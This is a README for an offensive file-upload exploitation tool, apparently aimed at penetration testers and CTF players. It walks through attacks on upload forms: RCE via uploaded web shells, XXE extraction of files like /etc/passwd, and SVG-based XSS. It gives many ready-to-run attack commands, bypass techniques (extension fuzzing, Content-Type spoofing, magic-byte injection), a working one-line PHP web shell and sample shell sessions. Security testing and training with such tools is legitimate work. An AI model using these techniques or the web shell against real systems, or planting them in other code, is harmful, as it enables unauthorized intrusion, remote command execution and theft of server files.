# 👻 File_Uploader – File Upload Exploitation Tool

# Description

File_Uploader is a powerful file upload exploitation and fuzzing tool designed for penetration testers, bug bounty hunters, and security researchers.
It automates testing of file upload vulnerabilities, including:
File extension fuzzing (php, asp, jsp, config, etc.)
Special character injection in filenames (null bytes, slashes, etc.)
Content-Type header fuzzing to bypass MIME filters
Magic bytes injection to trick server-side file type validation
Automatic web shell detection & interactive command execution
This tool is built to identify misconfigurations, whitelist bypasses, and RCE opportunities from vulnerable upload forms.

```
  ______ _ _        _                 _                       
 |  ____(_) |      | |               | |                      
 | |__   _| | ___  | |__  _   _ _ __ | | _____ _ __ ___  _ __  
 |  __| | | |/ _ \ | '_ \| | | | '_ \| |/ / _ \ '__/ _ \| '_ \ 
 | |    | | |  __/ | |_) | |_| | | | |   <  __/ | | (_) | | | |
 |_|    |_|_|\___| |_.__/ \__,_|_| |_|_|\_\___|_|  \___/|_| |_|

       [👻] F I L E _ U P L O A D E R . P Y [👻]
```

**Author:** Gh0stSh3ll5619  
**Company:** Ghost Ops Security  
**Website:** ghostops-security.com

---

##  Features

### Attack Modes
- **RCE (Remote Code Execution)** - Upload web shells and achieve command execution
- **XXE (XML External Entity)** - Extract sensitive files via SVG/XML payloads
- **XSS (Cross-Site Scripting)** - Test for stored XSS via SVG uploads

### Bypass Techniques
- ✅ Extension fuzzing (PHP, ASP, JSP variants)
- ✅ Content-Type header manipulation
- ✅ Magic byte injection (JPEG, PNG, GIF signatures)
- ✅ Special character encoding (`%00`, `%0a`, etc.)
- ✅ Date-based filename prefixes
- ✅ Multi-variant XXE payloads (base64, OOB, expect://)

### Advanced Features
- 🔄 Interactive file extraction mode (XXE)
- 🎯 Automatic base64 decoding
- 🔍 Multi-threaded testing (10 concurrent workers)
- 🌐 Proxy support (Burp Suite integration)
- 🍪 Cookie and custom header support
- 📊 Rich terminal output with color-coded results
- 🐚 Interactive web shell access

---

## 📦 Installation

### Requirements
```bash
pip install requests rich
```
---

##  Quick Start

### Basic RCE Attack
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --stop-on-success
```

### XXE Attack with Interactive Extraction
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode xxe \
  --stop-on-success
```

---

## 📖 Usage Guide

### Command-Line Arguments

#### Required Parameters
| Argument | Description | Example |
|----------|-------------|---------|
| `--upload-url` | Upload endpoint URL | `http://target.com/upload.php` |
| `--base-url` | Base URL of target | `http://target.com` |
| `--attack-mode` | Attack type: `rce`, `xxe`, or `xss` | `rce` |

#### Upload Configuration
| Argument | Description | Default | Example |
|----------|-------------|---------|---------|
| `--upload-path` | Directory where files are stored | `/profile_images/` | `/uploads/`, `/files/` |
| `--param-name` | Upload parameter name | `uploadFile` | `file`, `attachment` |
| `--date-prefix` | Enable date prefix on filenames | False | `--date-prefix` |
| `--date-format` | Date format for prefix | `%y%m%d` | `%Y%m%d`, `%Y-%m-%d` |

#### Extension & Content-Type Testing
| Argument | Description | Example |
|----------|-------------|---------|
| `--extensions` | Custom extensions to test | `php phar.jpg php5` |
| `--fuzz-content-type` | Test multiple content-types | `--fuzz-content-type` |
| `--content-types` | Specific content-types | `image/jpeg image/png` |
| `--magic-bytes` | Prepend file signatures | `--magic-bytes` |

#### XXE Configuration
| Argument | Description | Example |
|----------|-------------|---------|
| `--xxe-paths` | Files to extract | `/etc/passwd upload.php` |
| `--xxe-variants` | XXE payload types | `base64 classic expect` |
| `--check-page` | Page to check for XXE output | `http://target.com/gallery.php` |

**XXE Variants:**
- `simple` - Basic XXE payload
- `standard` - Standard SVG XXE
- `base64` - PHP filter base64 encoding (recommended)
- `classic` - Classic file read XXE
- `expect` - Command execution via expect://
- `oob` - Out-of-band XXE
- `all` - Test all variants

#### Network Configuration
| Argument | Description | Example |
|----------|-------------|---------|
| `--proxy` | HTTP proxy URL | `http://127.0.0.1:8080` |
| `--cookies` | Session cookies | `PHPSESSID=abc123;user=admin` |
| `--headers` | Custom HTTP headers | `Auth:Bearer xyz\|X-Token:abc` |

#### Other Options
| Argument | Description |
|----------|-------------|
| `--stop-on-success` | Stop after first successful exploit |
| `--verbose` / `-v` | Enable verbose output |

---

## 💡 Real-World Examples

### Example 1: Basic Upload Test
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --stop-on-success
```

### Example 2: Advanced RCE with All Bypasses
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --upload-path /uploads/ \
  --attack-mode rce \
  --magic-bytes \
  --fuzz-content-type \
  --date-prefix \
  --stop-on-success
```

### Example 3: HTB Academy Challenge
```bash
python3 file_uploader.py \
  --upload-url http://target.com/contact/submit.php \
  --base-url http://target.com \
  --upload-path /contact/user_feedback_submissions/ \
  --attack-mode rce \
  --date-prefix \
  --magic-bytes \
  --fuzz-content-type \
  --extensions phar.jpg phz.jpg \
  --param-name uploadFile \
  --stop-on-success
```

### Example 4: XXE File Extraction
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode xxe \
  --xxe-paths /etc/passwd upload.php config.php \
  --xxe-variants base64 \
  --stop-on-success
```
**Interactive mode:** Once XXE is found, you'll be prompted to extract additional files:
```
Enter file path to extract (or 'q' to quit, 'continue' to keep testing): /etc/hosts
Enter file path to extract: index.php
Enter file path to extract: q
```

### Example 5: WordPress Upload Test
```bash
python3 file_uploader.py \
  --upload-url http://target.com/wp-admin/upload.php \
  --base-url http://target.com \
  --upload-path /wp-content/uploads/2025/10/ \
  --attack-mode rce \
  --magic-bytes \
  --fuzz-content-type \
  --cookies "wordpress_logged_in=abc123" \
  --stop-on-success
```

### Example 6: Through Burp Suite Proxy
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --proxy http://127.0.0.1:8080 \
  --stop-on-success
```

### Example 7: Custom Extensions & Content-Types
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --extensions php5 phtml phar.jpg asp aspx \
  --content-types image/jpeg application/octet-stream text/plain \
  --magic-bytes \
  --stop-on-success
```

### Example 8: Different Date Formats
```bash
# Format: YYYYMMDD (20251006_)
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --date-prefix \
  --date-format "%Y%m%d" \
  --stop-on-success

# Format: YYYY-MM-DD (2025-10-06_)
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --date-prefix \
  --date-format "%Y-%m-%d" \
  --stop-on-success
```

---

## 🎓 Workflow Guide

### 1️⃣ Reconnaissance Phase
First, gather information about the upload mechanism:
```bash
# Basic test to understand the upload
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --extensions jpg \
  --verbose
```

### 2️⃣ Extension Fuzzing
Test various extensions to find what's accepted:
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --extensions php php3 php5 phtml phar phar.jpg phz.jpg \
  --verbose
```

### 3️⃣ Content-Type Bypass
If extensions are blocked, try content-type fuzzing:
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --fuzz-content-type \
  --stop-on-success
```

### 4️⃣ Magic Byte Injection
Bypass MIME type validation:
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode rce \
  --magic-bytes \
  --fuzz-content-type \
  --stop-on-success
```

### 5️⃣ XXE Exploitation
If SVG/XML uploads are allowed:
```bash
python3 file_uploader.py \
  --upload-url http://target.com/upload.php \
  --base-url http://target.com \
  --attack-mode xxe \
  --xxe-variants all \
  --stop-on-success
```

### 6️⃣ Shell Interaction
Once RCE is found, interact with the web shell:
```
shell> id
shell> pwd
shell> ls -la
shell> cat /etc/passwd
shell> exit
```

---

## 🔍 Output Interpretation

### Success Indicators
```
✓ RCE FOUND: ghostshell.phar.jpg (jpeg)
URL: http://target.com/uploads/251006_ghostshell.phar.jpg
```

### XXE Success
```
✓ XXE FOUND: evil.svg
Content-Type: image/svg+xml
Payload: XXE base64 /etc/passwd

═══ Base64 Decoded ═══
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Result Table Colors
- 🟢 **Green** - Successful exploitation (RCE/XXE/XSS found)
- 🟡 **Yellow** - Upload succeeded but no exploitation
- 🔴 **Red** - Upload failed

---

## 🛡️ Legal & Ethical Use

### ⚠️ WARNING
This tool is designed for **authorized security testing only**. Unauthorized access to computer systems is illegal.

### Acceptable Use
✅ Penetration testing with written authorization  
✅ Security research on owned infrastructure  
✅ CTF competitions and training labs  
✅ Vulnerability disclosure programs  
✅ Educational purposes on test environments  

**By using this tool, you agree to use it responsibly and legally.**

---

## 🐛 Troubleshooting

### Issue: No uploads succeeding
**Solution:** Check if the endpoint is correct and the parameter name matches:
```bash
# Try different parameter names
--param-name file
--param-name upload
--param-name attachment
```

### Issue: Uploads succeed but no RCE
**Possible causes:**
1. Wrong upload path - files may be stored elsewhere
2. Date prefix format mismatch
3. Extension not executable

**Solutions:**
```bash
# Try without date prefix
python3 file_uploader.py ... (remove --date-prefix)

# Try different upload paths
--upload-path /uploads/
--upload-path /files/
--upload-path /images/

# Check actual filenames in browser/Burp
```

### Issue: XXE not finding output
**Solution:** The output may appear on a different page:
```bash
--check-page http://target.com/gallery.php
--check-page http://target.com/
```

### Issue: SSL/TLS errors
**Solution:** The tool automatically disables SSL verification. Ensure your Python environment accepts this.

---

## 🔧 Advanced Techniques

### Custom Payload Development
Edit the `WEB_SHELL` variable in the script:
```python
WEB_SHELL = "<?php system($_GET['cmd']); ?>"
```

### Adding New Magic Bytes
```python
MAGIC_HEADERS = {
    'jpeg': b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01',
    'png': b'\x89PNG\r\n\x1a\n',
    'gif': b'GIF89a',
    'custom': b'\x00\x00\x00\x00',  # Add your own
}
```

### Custom XXE Payloads
Add new templates to the XXE payload section in the code.

---

## 📝 Changelog

### Version 1.0
- Initial release
- RCE, XXE, and XSS attack modes
- Magic byte injection
- Content-type fuzzing
- Date prefix support
- Interactive XXE extraction mode
- Multi-threaded scanning
- Proxy and authentication support

---

## 🤝 Contributing

Found a bug or have a feature request? Contact Ghost Ops Security.

---

## 📄 License

This tool is provided for educational and authorized security testing purposes only.

**Ghost Ops Security** - Professional Penetration Testing Services  
**Website:** ghostops-security.com  
**Author:** Gh0stSh3ll5619

---

👻 Happy Hunting! 👻

